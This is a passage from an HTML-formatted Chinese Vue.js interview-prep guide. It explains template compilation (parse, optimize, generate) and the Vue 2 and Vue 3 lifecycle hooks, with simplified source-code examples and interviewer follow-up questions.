href=\\"#再看全局\\">#</a> 再看全局</h3>\\n<p><img src=\\"https://s.poetries.top/gitee/2020/07/vue/7.png\\" alt=\\"\\"></p>\\n<p>回过头再来看看这张图，是不是大脑中已经有一个大概的脉络了呢？</p>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>你在评审一个 <code>Vue</code> 页面性能方案，候选人只凭这张全局图就断言瓶颈一定在 <code>diff</code>，你会接受这个判断吗？</strong></p>\\n<p>不会，仅凭全局图只能建立模块脉络，不能定位具体瓶颈。应先把页面现象映射到模板处理、渲染或更新等对应环节，再用实际调用链和测量结果验证；图中未明确的细节不能当作结论。</p>\\n</li>\\n<li>\\n<p><strong>新人接手一个包含几十个组件的页面，看完全局图后仍不知道从哪里读源码，你会让他怎样落地这张图？</strong></p>\\n<p>先选择一条可观察的主链路，从输入、处理中间产物一直追到页面结果，并把源码模块标回图中。每次只验证一条连接是否真实存在；若图与当前代码版本不一致，应以源码行为为准并修正笔记。</p>\\n</li>\\n<li>\\n<p><strong>团队把这张图从旧项目直接搬到新版本 <code>Vue</code> 的培训文档里，哪些内容不能默认继续成立？</strong></p>\\n<p>图中的模块边界、处理阶段和调用关系都需要重新核对，不能因概念名称相似就认定实现相同。尤其涉及内部函数、执行时机和优化策略时，应结合目标版本源码确认；这类总览图适合导航，不适合作为版本兼容承诺。</p>\\n</li>\\n<li>\\n<p><strong>线上页面出现首次渲染异常，值班同学沿着全局图逐层排查却卡住了，你会要求他补充哪些证据？</strong></p>\\n<p>先补充可复现输入、报错栈、组件边界以及异常发生在首次创建还是后续更新，再把证据落到图中的具体链路。若只能确认最终页面错误而无法确定中间阶段，就应缩小复现范围，避免依据总览图猜测根因。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_9-如何理解vue中模板编译原理\\"><a class=\\"header-anchor\\" href=\\"#_9-如何理解vue中模板编译原理\\">#</a> 9 如何理解Vue中模板编译原理</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>三步：<strong>解析（parse）</strong> 模板生成 <code>AST</code> → <strong>优化（optimize）</strong> 标记静态节点 → <strong>生成（generate）</strong> <code>render</code> 函数代码</li>\\n<li>解析用正则匹配标签、属性、文本，维护一个栈来处理嵌套结构</li>\\n<li>优化的目的是让静态节点在后续更新中<strong>跳过 diff</strong> —— 它们永远不会变</li>\\n<li>生成阶段产出的是 <code>with(this){return _c(\'div\',{...},[_v(_s(msg))])}</code> 这样的代码字符串，再用 <code>new Function</code> 变成函数</li>\\n<li><code>Vue 3</code> 的编译器强很多：静态提升到渲染函数外、<code>PatchFlag</code> 标记动态内容类型、事件缓存</li>\\n</ul>\\n<p><strong><code>Vue</code> 模板编译本质上是把 <code>template</code> 转成可执行的 <code>render</code> 函数，过程分为解析、优化和代码生成。</strong> <code>parse</code> 根据标签、属性和文本构建 <code>AST</code>，让模板变成便于处理的树结构。<code>optimize</code> 会标记静态节点，因为这些内容不会变化，后续更新时可以跳过相关 <code>diff</code>。最后 <code>generate</code> 根据 <code>AST</code> 生成代码字符串，并可通过 <code>new Function</code> 得到真正的渲染函数。</p>\\n</section>\\n<blockquote>\\n<p><code>Vue</code> 的编译过程就是将 <code>template</code> 转化为 <code>render</code> 函数的过程</p>\\n</blockquote>\\n<ul>\\n<li><strong>解析生成AST树</strong> 将<code>template</code>模板转化成<code>AST</code>语法树，使用大量的正则表达式对模板进行解析，遇到标签、文本的时候都会执行对应的钩子进行相关处理</li>\\n<li><strong>标记优化</strong> 对静态语法做静态标记 <code>markup</code>(静态节点如<code>div</code>下有<code>p</code>标签内容不会变化) <code>diff</code>来做优化 静态节点跳过<code>diff</code>操作\\n<ul>\\n<li><code>Vue</code>的数据是响应式的，但其实模板中并不是所有的数据都是响应式的。有一些数据首次渲染后就不会再变化，对应的<code>DOM</code>也不会变化。那么优化过程就是深度遍历<code>AST</code>树，按照相关条件对树节点进行标记。这些被标记的节点(静态节点)我们就可以跳过对它们的比对，对运行时的模板起到很大的优化作用</li>\\n<li>等待后续节点更新，如果是静态的，不会在比较<code>children</code>了</li>\\n</ul>\\n</li>\\n<li><strong>代码生成</strong> 编译的最后一步是将优化后的<code>AST</code>树转换为可执行的代码</li>\\n</ul>\\n<div class=\\"tip\\">\\n<p><strong>思路</strong></p>\\n<ul>\\n<li>引入<code>vue</code>编译器概念</li>\\n<li>说明编译器的必要性</li>\\n<li>阐述编译器工作流程</li>\\n</ul>\\n<p><strong>回答范例</strong></p>\\n<ol>\\n<li><code>Vue</code>中有个独特的编译器模块，称为<code>compiler</code>，它的主要作用是将用户编写的<code>template</code>编译为<code>js</code>中可执行的<code>render</code>函数。</li>\\n<li>之所以需要这个编译过程是为了便于前端能高效的编写视图模板。相比而言，我们还是更愿意用<code>HTML</code>来编写视图，直观且高效。手写<code>render</code>函数不仅效率底下，而且失去了编译期的优化能力。</li>\\n<li>在<code>Vue</code>中编译器会先对<code>template</code>进行解析，这一步称为<code>parse</code>，结束之后会得到一个<code>JS</code>对象，我们称为<strong>抽象语法树AST</strong>，然后是对<code>AST</code>进行深加工的转换过程，这一步成为<code>transform</code>，最后将前面得到的<code>AST</code>生成为<code>JS</code>代码，也就是<code>render</code>函数</li>\\n</ol>\\n<p><strong>可能的追问</strong></p>\\n<ol>\\n<li><code>Vue</code>中编译器何时执行？</li>\\n</ol>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/d1162df23e6b6fa4.png\\" alt=\\"\\"></p>\\n<blockquote>\\n<p>在 <code>new Vue()</code>之后。 <code>Vue</code> 会调用 <code>_init</code> 函数进行初始化，也就是这里的 <code>init</code> 过程，它会初始化生命周期、事件、 <code>props</code>、 <code>methods</code>、 <code>data</code>、 <code>computed</code> 与 <code>watch</code>等。其中最重要的是通过 <code>Object.defineProperty</code> 设置 <code>setter</code> 与 <code>getter</code> 函数，用来实现「响应式」以及「依赖收集」</p>\\n</blockquote>\\n<ul>\\n<li>初始化之后调用 <code>$mount</code> 会挂载组件，如果是运行时编译，即不存在 <code>render function</code> 但是存在 <code>template</code> 的情况，需要进行「编译」步骤</li>\\n<li><code>compile</code>编译可以分成 <code>parse</code>、<code>optimize</code> 与 <code>generate</code> 三个阶段，最终需要得到 <code>render function</code></li>\\n</ul>\\n<ol start=\\"2\\">\\n<li><code>React</code>有没有编译器？</li>\\n</ol>\\n<p><code>react</code> 使用<code>babel</code>将<code>JSX</code>语法解析</p>\\n</div>\\n<pre class=\\"language-html\\"><code>&lt;div id=&quot;app&quot;&gt;&lt;/div&gt;\\n&lt;script&gt;\\n    let vm = new Vue({\\n        el: &#39;#app&#39;,\\n        template: `&lt;div&gt;\\n            // &lt;span&gt;hello world&lt;/span&gt; 是静态节点\\n            &lt;span&gt;hello world&lt;/span&gt;    \\n            // &lt;p&gt;{{name}}&lt;/p&gt; 是动态节点\\n            &lt;p&gt;{{name}}&lt;/p&gt;\\n        &lt;/div&gt;`,\\n        data() {\\n          return { name: &#39;test&#39; }\\n        }\\n    });\\n&lt;/script&gt;\\n</code></pre>\\n<p>源码分析</p>\\n<pre class=\\"language-js\\"><code>export function compileToFunctions(template) {\\n  // 我们需要把html字符串变成render函数\\n  // 1.把html代码转成ast语法树  ast用来描述代码本身形成树结构 不仅可以描述html 也能描述css以及js语法\\n  // 很多库都运用到了ast 比如 webpack babel eslint等等\\n  let ast = parse(template);\\n  // 2.优化静态节点：对ast树进行标记,标记静态节点\\n    if (options.optimize !== false) {\\n      optimize(ast, options);\\n    }\\n\\n  // 3.通过ast 重新生成代码\\n  // 我们最后生成的代码需要和render函数一样\\n  // 类似_c(&#39;div&#39;,{id:&quot;app&quot;},_c(&#39;div&#39;,undefined,_v(&quot;hello&quot;+_s(name)),_c(&#39;span&#39;,undefined,_v(&quot;world&quot;))))\\n  // _c代表创建元素 _v代表创建文本 _s代表文Json.stringify--把对象解析成文本\\n  let code = generate(ast);\\n  //   使用with语法改变作用域为this  之后调用render函数可以使用call改变this 方便code里面的变量取值\\n  let renderFn = new Function(`with(this){return ${code}}`);\\n  return renderFn;\\n}\\n</code></pre>\\n<h3 id=\\"vue-complier-实现\\"><a class=\\"header-anchor\\" href=\\"#vue-complier-实现\\">#</a> Vue complier 实现</h3>\\n<ul>\\n<li>模板解析这种事，本质是将数据转化为一段 <code>html</code> ，最开始出现在后端，经过各种处理吐给前端。随着各种 <code>mv*</code> 的兴起，模板解析交由前端处理。</li>\\n<li>总的来说，<code>Vue complier</code> 是将 <code>template</code> 转化成一个 <code>render</code> 字符串。</li>\\n</ul>\\n<blockquote>\\n<p>可以简单理解成以下步骤：</p>\\n</blockquote>\\n<ul>\\n<li><code>parse</code> 过程，将 <code>template</code> 利用正则转化成<code>AST</code> 抽象语法树。</li>\\n<li><code>optimize</code> 过程，标记静态节点，后 <code>diff</code> 过程跳过静态节点，提升性能。</li>\\n<li><code>generate</code> 过程，生成 <code>render</code> 字符串</li>\\n</ul>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>一个后台页面的 <code>template</code> 里有大量不会变化的标题和容器，候选人说编译器只负责把它转成 <code>render</code> 字符串，不参与性能优化，你怎么纠正？</strong></p>\\n<p>这个判断漏掉了 <code>optimize</code> 阶段，编译器会识别并标记静态节点，使后续 <code>diff</code> 能跳过它们。完整链路是先由 <code>parse</code> 生成 <code>AST</code>，再优化静态部分，最后由 <code>generate</code> 产出 <code>render</code> 字符串；具体优化效果仍取决于模板中可判定的静态内容。</p>\\n</li>\\n<li>\\n<p><strong>你在做一个模板编辑器，用户提交的模板编译后报错；日志里只有最终 <code>render</code> 字符串，应该怎样补齐排查链路？</strong></p>\\n<p>应分别保留原始 <code>template</code>、<code>parse</code> 生成的 <code>AST</code>、静态标记结果和 <code>generate</code> 输出，以判断错误在哪个阶段引入。若 <code>AST</code> 已经错误，优先查模板解析；若树结构正确而输出异常，再检查生成过程，不能只盯最终字符串反推。</p>\\n</li>\\n<li>\\n<p><strong>产品要求让用户在线输入模板并立即展示，原有构建阶段的编译链路需要面对什么约束变化？</strong></p>\\n<p>核心转换仍可按 <code>parse</code>、<code>optimize</code>、<code>generate</code> 理解，但编译被移到用户操作路径后，非法输入、错误提示和执行安全都会成为显式约束。不能未经校验就执行生成结果；来源不可信时，还需要限制模板能力或采用隔离方案。</p>\\n</li>\\n<li>\\n<p><strong>某次改动后，列表更新时原本静态的节点也频繁进入 <code>diff</code>，你会优先检查哪一段编译过程？</strong></p>\\n<p>优先检查 <code>optimize</code> 阶段是否仍正确标记静态节点，并对比改动前后的 <code>AST</code> 与标记结果。若节点包含动态绑定，它可能已不满足静态条件；若模板未变却标记消失，再追查解析结果或优化逻辑，而不是直接修改运行时 <code>diff</code>。</p>\\n</li>\\n<li>\\n<p><strong>团队争论是直接手写复杂 <code>render</code>，还是继续维护 <code>template</code> 编译链路，你会怎样定边界？</strong></p>\\n<p>若选择 <code>template</code>，编译器能经过 <code>parse</code>、静态标记和 <code>generate</code> 形成统一产物，维护者也能检查各阶段结果。手写 `render`` 可绕开模板转换，但相应地不能默认获得这条编译流程提供的静态标记；应依据表达能力和可维护性取舍，而非笼统认定一方更快。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_10-vue生命周期相关\\"><a class=\\"header-anchor\\" href=\\"#_10-vue生命周期相关\\">#</a> 10 Vue生命周期相关</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>四组八个：创建（<code>beforeCreate</code>/<code>created</code>）、挂载（<code>beforeMount</code>/<code>mounted</code>）、更新（<code>beforeUpdate</code>/<code>updated</code>）、销毁（<code>beforeDestroy</code>/<code>destroyed</code>）</li>\\n<li>关键分界：<code>created</code> <strong>有数据没 DOM</strong>（适合发请求）、<code>mounted</code> 才有 <code>$el</code> 和 <code>$refs</code>（适合操作 DOM）</li>\\n<li>父子顺序：<code>created</code> 父→子，<code>mounted</code> 子→父；更新和销毁同理&quot;外层先开始、内层先完成&quot;</li>\\n<li><code>keep-alive</code> 组件额外有 <code>activated</code>/<code>deactivated</code>，<strong>缓存命中时 <code>mounted</code> 不会再执行</strong></li>\\n<li>销毁时必须清理：定时器、<code>window</code> 上的监听、<code>WebSocket</code>、第三方实例的 <code>dispose</code>、未完成请求的 <code>abort</code></li>\\n</ul>\\n<p><strong><code>Vue</code> 生命周期覆盖创建、挂载、更新和销毁四个阶段，每个阶段都有前后两个钩子。</strong> <code>created</code> 时数据和方法已经可用，但还没有 <code>$el</code>；到了 <code>mounted</code> 才适合访问已挂载的 <code>DOM</code>，需要等待完整视图时可配合 <code>$nextTick</code>。父子组件执行时通常是外层先开始、内层先完成，例如挂载时子组件的 <code>mounted</code> 先于父组件。使用 <code>keep-alive</code> 还要关注 <code>activated</code>、<code>deactivated</code>，销毁阶段则应清理定时器和事件监听。</p>\\n</section>\\n<h3 id=\\"vue的生命周期方法有哪些\\"><a class=\\"header-anchor\\" href=\\"#vue的生命周期方法有哪些\\">#</a> Vue的生命周期方法有哪些</h3>\\n<ol>\\n<li><code>Vue</code> 实例有一个完整的生命周期，也就是从<code>开始创建</code>、<code>初始化数据</code>、<code>编译模版</code>、<code>挂载Dom -&gt; 渲染</code>、<code>更新 -&gt; 渲染</code>、<code>卸载</code>等一系列过程，我们称这是<code>Vue</code>的生命周期</li>\\n<li><code>Vue</code> 生命周期总共分为8个阶段<code>创建前/后</code>，<code>载入前/后</code>，<code>更新前/后</code>，<code>销毁前/后</code></li>\\n</ol>\\n<blockquote>\\n<p><code>beforeCreate</code> =&gt; <code>created</code> =&gt; <code>beforeMount</code> =&gt; <code>Mounted</code> =&gt; <code>beforeUpdate</code> =&gt; <code>updated</code> =&gt; <code>beforeDestroy</code> =&gt; <code>destroyed</code>。<code>keep-alive</code>下：<code>activated</code> <code>deactivated</code></p>\\n</blockquote>\\n<blockquote>\\n<p><strong>Vue 3 的命名变化（面试常问）</strong>：销毁阶段的两个钩子改名了——<code>beforeDestroy</code> → <strong><code>beforeUnmount</code></strong>、<code>destroyed</code> → <strong><code>unmounted</code></strong>（语义从「销毁」统一为「卸载」）。其余钩子名不变。<strong>组合式 API（<code>setup</code>）里的钩子加 <code>on</code> 前缀并作为函数调用</strong>：<code>onMounted</code>、<code>onBeforeUnmount</code>、<code>onUnmounted</code>、<code>onUpdated</code> 等；其中 <code>beforeCreate</code>/<code>created</code> 在组合式里<strong>没有对应的 <code>on</code> 钩子</strong>——<code>setup</code> 本身就在这两个时机之间执行，直接把逻辑写在 <code>setup</code> 顶部即可。<code>keep-alive</code> 的 <code>activated</code>/<code>deactivated</code> 对应 <code>onActivated</code>/<code>onDeactivated</code>。</p>\\n</blockquote>\\n<table>\\n<thead>\\n<tr>\\n<th>生命周期vue2</th>\\n<th>生命周期vue3</th>\\n<th>描述</th>\\n</tr>\\n</thead>\\n<tbody>\\n<tr>\\n<td><code>beforeCreate</code></td>\\n<td><code>beforeCreate</code></td>\\n<td>在实例初始化之后，数据观测(<code>data observer</code>) 之前被调用。</td>\\n</tr>\\n<tr>\\n<td><code>created</code></td>\\n<td><code>created</code></td>\\n<td>实例已经创建完成之后被调用。在这一步，实例已完成以下的配置：数据观测(<code>data observer</code>)，属性和方法的运算， <code>watch/event</code> 事件回调。这里没有<code>$el</code></td>\\n</tr>\\n<tr>\\n<td><code>beforeMount</code></td>\\n<td><code>beforeMount</code></td>\\n<td>在挂载开始之前被调用：相关的 <code>render</code> 函数首次被调用</td>\\n</tr>\\n<tr>\\n<td><code>mounted</code></td>\\n<td><code>mounted</code></td>\\n<td><code>el</code> 被新创建的 <code>vm.$el</code> 替换，并挂载到实例上去之后调用该钩子</td>\\n</tr>\\n<tr>\\n<td><code>beforeUpdate</code></td>\\n<td><code>beforeUpdate</code></td>\\n<td>组件数据更新之前调用，发生在虚拟 <code>DOM</code> 打补丁之前</td>\\n</tr>\\n<tr>\\n<td><code>updated</code></td>\\n<td><code>updated</code></td>\\n<td>由于数据更改导致的虚拟 <code>DOM</code> 重新渲染和打补丁，在这之后会调用该钩子</td>\\n</tr>\\n<tr>\\n<td><code>beforeDestroy</code></td>\\n<td><code>beforeUnmount</code></td>\\n<td>实例销毁之前调用。在这一步，实例仍然完全可用</td>\\n</tr>\\n<tr>\\n<td><code>destroyed</code></td>\\n<td><code>unmounted</code></td>\\n<td>实例销毁后调用。调用后， <code>Vue</code> 实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁。 该钩子在服务器端渲染期间不被调用。</td>\\n</tr>\\n</tbody>\\n</table>\\n<p>其他几个生命周期</p>\\n<table>\\n<thead>\\n<tr>\\n<th>生命周期vue2</th>\\n<th>生命周期vue3</th>\\n<th>描述</th>\\n</tr>\\n</thead>\\n<tbody>\\n<tr>\\n<td><code>activated</code></td>\\n<td><code>activated</code></td>\\n<td><code>keep-alive</code>专属，组件被激活时调用</td>\\n</tr>\\n<tr>\\n<td><code>deactivated</code></td>\\n<td><code>deactivated</code></td>\\n<td><code>keep-alive</code>专属，组件被销毁时调用</td>\\n</tr>\\n<tr>\\n<td><code>errorCaptured</code></td>\\n<td><code>errorCaptured</code></td>\\n<td>捕获一个来自子孙组件的错误时被调用</td>\\n</tr>\\n<tr>\\n<td>-</td>\\n<td><code>renderTracked</code></td>\\n<td>调试钩子，响应式依赖被收集时调用</td>\\n</tr>\\n<tr>\\n<td>-</td>\\n<td><code>renderTriggered</code></td>\\n<td>调试钩子，响应式依赖被触发时调用</td>\\n</tr>\\n<tr>\\n<td>-</td>\\n<td><code>serverPrefetch</code></td>\\n<td><code>ssr only</code>，组件实例在服务器上被渲染前调用</td>\\n</tr>\\n</tbody>\\n</table>\\n<ol start=\\"3\\">\\n<li><strong>要掌握每个生命周期内部可以做什么事</strong></li>\\n</ol>\\n<ul>\\n<li><code>beforeCreate</code> 初始化<code>vue</code>实例，进行数据观测。执行时组件实例还未创建，通常用于插件开发中执行一些初始化任务</li>\\n<li><code>created</code> 组件初始化完毕，可以访问各种数据，获取接口数据等</li>\\n<li><code>beforeMount</code> 此阶段<code>vm.el</code>虽已完成<code>DOM</code>初始化，但并未挂载在<code>el</code>选项上</li>\\n<li><code>mounted</code> 实例已经挂载完成，可以进行一些<code>DOM</code>操作</li>\\n<li><code>beforeUpdate</code> 更新前，可用于获取更新前各种状态。此时<code>view</code>层还未更新，可用于获取更新前各种状态。可以在这个钩子中进一步地更改状态，这不会触发附加的重渲染过程。</li>\\n<li><code>updated</code> 完成<code>view</code>层的更新，更新后，所有状态已是最新。可以执行依赖于 <code>DOM</code> 的操作。然而在大多数情况下，你应该避免在此期间更改状态，因为这可能会导致更新无限循环。 该钩子在服务器端渲染期间不被调用。</li>\\n<li><code>destroyed</code> 可以执行一些优化操作,清空定时器，解除绑定事件</li>\\n<li>vue3 <code>beforeunmount</code>：实例被销毁前调用，可用于一些定时器或订阅的取消</li>\\n<li>vue3 <code>unmounted</code>：销毁一个实例。可清理它与其它实例的连接，解绑它的全部指令及事件监听器</li>\\n</ul>\\n<p><img src=\\"https://s.poetries.top/gitee/2020/07/61.png\\" alt=\\"\\"></p>\\n<pre class=\\"language-html\\"><code>&lt;div id=&quot;app&quot;&gt;{{name}}&lt;/div&gt;\\n&lt;script&gt;\\n    const vm = new Vue({\\n        data(){\\n            return {name:&#39;poetries&#39;}\\n        },\\n        el: &#39;#app&#39;,\\n        beforeCreate(){\\n            // 数据观测(data observer) 和 event/watcher 事件配置之前被调用。\\n            console.log(&#39;beforeCreate&#39;);\\n        },\\n        created(){\\n            // 属性和方法的运算， watch/event 事件回调。这里没有$el\\n            console.log(&#39;created&#39;)\\n        },\\n        beforeMount(){\\n            // 相关的 render 函数首次被调用。\\n            console.log(&#39;beforeMount&#39;)\\n        },\\n        mounted(){\\n            // 被新创建的 vm.$el 替换\\n            console.log(&#39;mounted&#39;)\\n        },\\n        beforeUpdate(){\\n            //  数据更新时调用，发生在虚拟 DOM 重新渲染和打补丁之前。\\n            console.log(&#39;beforeUpdate&#39;)\\n        },\\n        updated(){\\n            //  由于数据更改导致的虚拟 DOM 重新渲染和打补丁，在这之后会调用该钩子。\\n            console.log(&#39;updated&#39;)\\n        },\\n        beforeDestroy(){\\n            // 实例销毁之前调用 实例仍然完全可用\\n            console.log(&#39;beforeDestroy&#39;)\\n        },\\n        destroyed(){ \\n            // 所有东西都会解绑定，所有的事件监听器会被移除\\n            console.log(&#39;destroyed&#39;)\\n        }\\n    });\\n    setTimeout(() =&gt; {\\n        vm.name = &#39;poetry&#39;;\\n        setTimeout(() =&gt; {\\n            vm.$destroy()  \\n        }, 1000);\\n    }, 1000);\\n&lt;/script&gt;\\n</code></pre>\\n<ol start=\\"4\\">\\n<li>组合式API生命周期钩子</li>\\n</ol>\\n<p>你可以通过在生命周期钩子前面加上 “<code>on</code>” 来访问组件的生命周期钩子。</p>\\n<p>下表包含如何在 <code>setup()</code> 内部调用生命周期钩子：</p>\\n<table>\\n<thead>\\n<tr>\\n<th>选项式 API</th>\\n<th>Hook inside setup</th>\\n</tr>\\n</thead>\\n<tbody>\\n<tr>\\n<td><code>beforeCreate</code></td>\\n<td>不需要*</td>\\n</tr>\\n<tr>\\n<td><code>created</code></td>\\n<td>不需要*</td>\\n</tr>\\n<tr>\\n<td><code>beforeMount</code></td>\\n<td><code>onBeforeMount</code></td>\\n</tr>\\n<tr>\\n<td><code>mounted</code></td>\\n<td><code>onMounted</code></td>\\n</tr>\\n<tr>\\n<td><code>beforeUpdate</code></td>\\n<td><code>onBeforeUpdate</code></td>\\n</tr>\\n<tr>\\n<td><code>updated</code></td>\\n<td><code>onUpdated</code></td>\\n</tr>\\n<tr>\\n<td><code>beforeUnmount</code></td>\\n<td><code>onBeforeUnmount</code></td>\\n</tr>\\n<tr>\\n<td><code>unmounted</code></td>\\n<td><code>onUnmounted</code></td>\\n</tr>\\n<tr>\\n<td><code>errorCaptured</code></td>\\n<td><code>onErrorCaptured</code></td>\\n</tr>\\n<tr>\\n<td><code>renderTracked</code></td>\\n<td><code>onRenderTracked</code></td>\\n</tr>\\n<tr>\\n<td><code>renderTriggered</code></td>\\n<td><code>onRenderTriggered</code></td>\\n</tr>\\n</tbody>\\n</table>\\n<blockquote>\\n<p>因为 <code>setup</code> 是围绕 <code>beforeCreate</code> 和 <code>created</code> 生命周期钩子运行的，所以不需要显式地定义它们。换句话说，在这些钩子中编写的任何代码都应该直接在 <code>setup</code> 函数中编写</p>\\n</blockquote>\\n<pre class=\\"language-js\\"><code>export default {\\n  setup() {\\n    // mounted\\n    onMounted(() =&gt; {\\n      console.log(&#39;Component is mounted!&#39;)\\n    })\\n  }\\n}\\n</code></pre>\\n<p><strong><code>setup</code>和<code>created</code>谁先执行？</strong></p>\\n<ul>\\n<li><code>beforeCreate</code>:组件被创建出来，组件的<code>methods</code>和<code>data</code>还没初始化好</li>\\n<li><code>setup</code>：在<code>beforeCreate</code>和<code>created</code>之前执行</li>\\n<li><code>created</code>:组件被创建出来，组件的<code>methods</code>和<code>data</code>已经初始化好了</li>\\n</ul>\\n<blockquote>\\n<p>由于在执行<code>setup</code>的时候，<code>created</code>还没有创建好，所以在<code>setup</code>函数内我们是无法使用<code>data</code>和<code>methods</code>的。所以<code>vue</code>为了让我们避免错误的使用，直接将<code>setup</code>函数内的<code>this</code>执行指向<code>undefined</code></p>\\n</blockquote>\\n<pre class=\\"language-js\\"><code>import { ref } from &quot;vue&quot;\\nexport default {\\n  // setup函数是组合api的入口函数，注意在组合api中定义的变量或者方法，要在template响应式需要return{}出去\\n  setup(){\\n    let count = ref(1)\\n    function myFn(){\\n      count.value +=1\\n    }\\n    return {count,myFn}\\n  },\\n  \\n}\\n</code></pre>\\n<ol start=\\"5\\">\\n<li>其他问题</li>\\n</ol>\\n<ul>\\n<li><strong>什么是vue生命周期？</strong>  Vue 实例从创建到销毁的过程，就是生命周期。从开始创建、初始化数据、编译模板、挂载Dom→渲染、更新→渲染、销毁等一系列过程，称之为 <code>Vue</code> 的生命周期。</li>\\n<li><strong>vue生命周期的作用是什么？</strong> 它的生命周期中有多个事件钩子，让我们在控制整个Vue实例的过程时更容易形成好的逻辑。</li>\\n<li><strong>vue生命周期总共有几个阶段？</strong> 它可以总共分为<code>8</code>个阶段：创建前/后、载入前/后、更新前/后、销毁前/销毁后。</li>\\n<li><strong>第一次页面加载会触发哪几个钩子？</strong> 会触发下面这几个<code>beforeCreate</code>、<code>created</code>、<code>beforeMount</code>、<code>mounted</code> 。</li>\\n<li><strong>你的接口请求一般放在哪个生命周期中？</strong> 接口请求一般放在<code>mounted</code>中，但需要注意的是服务端渲染时不支持<code>mounted</code>，需要放到<code>created</code>中</li>\\n<li><strong>DOM 渲染在哪个周期中就已经完成？</strong> 在<code>mounted</code>中，\\n<ul>\\n<li>注意 <code>mounted</code> 不会承诺所有的子组件也都一起被挂载。如果你希望等到整个视图都渲染完毕，可以用 <code>vm.$nextTick</code> 替换掉 <code>mounted</code></li>\\n</ul>\\n<pre class=\\"language-js\\"><code>  mounted: function () {\\n    this.$nextTick(function () {\\n        // Code that will run only after the\\n        // entire view has been rendered\\n    })\\n  }\\n</code></pre>\\n</li>\\n</ul>\\n<h3 id=\\"父组件可以监听到子组件的生命周期吗\\"><a class=\\"header-anchor\\" href=\\"#父组件可以监听到子组件的生命周期吗\\">#</a> 父组件可以监听到子组件的生命周期吗</h3>\\n<p>比如有父组件 <code>Parent</code> 和子组件 <code>Child</code>，如果父组件监听到子组件挂载 <code>mounted</code> 就做一些逻辑处理，可以通过以下写法实现：</p>\\n<pre class=\\"language-js\\"><code>// Parent.vue\\n&lt;Child @mounted=&quot;doSomething&quot;/&gt;\\n    \\n// Child.vue\\nmounted() {\\n  this.$emit(&quot;mounted&quot;);\\n}\\n</code></pre>\\n<p>以上需要手动通过 <code>$emit</code> 触发父组件的事件，更简单的方式可以在父组件引用子组件时通过 <code>@hook</code> 来监听即可，如下所示：</p>\\n<pre class=\\"language-js\\"><code>//  Parent.vue\\n&lt;Child @hook:mounted=&quot;doSomething&quot; &gt;&lt;/Child&gt;\\n\\ndoSomething() {\\n   console.log(&#39;父组件监听到 mounted 钩子函数 ...&#39;);\\n},\\n    \\n//  Child.vue\\nmounted(){\\n   console.log(&#39;子组件触发 mounted 钩子函数 ...&#39;);\\n},    \\n    \\n// 以上输出顺序为：\\n// 子组件触发 mounted 钩子函数 ...\\n// 父组件监听到 mounted 钩子函数 ...     \\n</code></pre>\\n<p>当然 <code>@hook</code> 方法不仅仅是可以监听 <code>mounted</code>，其它的生命周期事件，例如：<code>created</code>，<code>updated</code> 等都可以监听</p>\\n<h3 id=\\"vue生命周期钩子是如何实现的\\"><a class=\\"header-anchor\\" href=\\"#vue生命周期钩子是如何实现的\\">#</a> Vue生命周期钩子是如何实现的</h3>\\n<ul>\\n<li><code>vue</code>的生命周期钩子就是回调函数而已，当创建组件实例的过程中会调用对应的钩子方法</li>\\n<li>内部会对钩子函数进行处理，将钩子函数维护成数组的形式</li>\\n</ul>\\n<blockquote>\\n<p><code>Vue</code> 的生命周期钩子核心实现是利用发布订阅模式先把用户传入的的生命周期钩子订阅好（内部采用数组的方式存储）然后在创建组件实例的过程中会一次执行对应的钩子方法（发布）</p>\\n</blockquote>\\n<pre class=\\"language-html\\"><code>&lt;script&gt;\\n    // Vue.options 中会存放所有全局属性\\n\\n    // 会用自身的 + Vue.options 中的属性进行合并\\n    // Vue.mixin({\\n    //     beforeCreate() {\\n    //         console.log(&#39;before 0&#39;)\\n    //     },\\n    // })\\n    debugger;\\n    const vm = new Vue({\\n        el: &#39;#app&#39;,\\n        beforeCreate: [\\n            function() {\\n                console.log(&#39;before 1&#39;)\\n            },\\n            function() {\\n                console.log(&#39;before 2&#39;)\\n            }\\n        ]\\n    });\\n    console.log(vm);\\n&lt;/script&gt;\\n</code></pre>\\n<p>相关代码如下</p>\\n<pre class=\\"language-js\\"><code>export function callHook(vm, hook) {\\n  // 依次执行生命周期对应的方法\\n  const handlers = vm.$options[hook];\\n  if (handlers) {\\n    for (let i = 0; i &lt; handlers.length; i++) {\\n      handlers[i].call(vm); //生命周期里面的this指向当前实例\\n    }\\n  }\\n}\\n\\n// 调用的时候\\nVue.prototype._init = function (options) {\\n  const vm = this;\\n  vm.$options = mergeOptions(vm.constructor.options, options);\\n  callHook(vm, &quot;beforeCreate&quot;); //初始化数据之前\\n  // 初始化状态\\n  initState(vm);\\n  callHook(vm, &quot;created&quot;); //初始化数据之后\\n  if (vm.$options.el) {\\n    vm.$mount(vm.$options.el);\\n  }\\n};\\n\\n// 销毁实例实现\\nVue.prototype.$destory = function() {\\n\\t // 触发钩子\\n    callHook(vm, &#39;beforeDestory&#39;)\\n    // 自身及子节点\\n    remove() \\n    // 删除依赖\\n    watcher.teardown() \\n    // 删除监听\\n    vm.$off() \\n    // 触发钩子\\n    callHook(vm, &#39;destoryed&#39;)\\n}\\n</code></pre>\\n<p><strong>原理流程图</strong></p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/11e0dfbc20b273d4.png\\" alt=\\"\\"></p>\\n<h3 id=\\"vue-的父子组件生命周期钩子函数执行顺序\\"><a class=\\"header-anchor\\" href=\\"#vue-的父子组件生命周期钩子函数执行顺序\\">#</a> Vue 